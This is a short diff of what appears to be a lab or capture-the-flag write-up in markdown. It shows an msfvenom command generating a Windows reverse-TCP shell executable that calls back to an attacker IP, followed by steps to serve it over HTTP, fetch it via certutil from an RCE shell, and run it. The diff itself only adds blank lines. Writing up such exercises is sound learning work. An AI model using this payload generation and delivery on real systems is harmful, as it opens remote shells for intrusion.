@@ -33,11 +33,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.39.178 LPORT=8888 -f exe > shel
 We open a port and get the file from the RCE shell.
 
 Host:
+
 ```bash
 python3 -m http.server 8000
 ```
 
 Victim:
+
 ![fetch files](images/certutil.png)
 
 Now we listen to port `8888` on host and execute `shell-x86.exe` from the RCE shell.
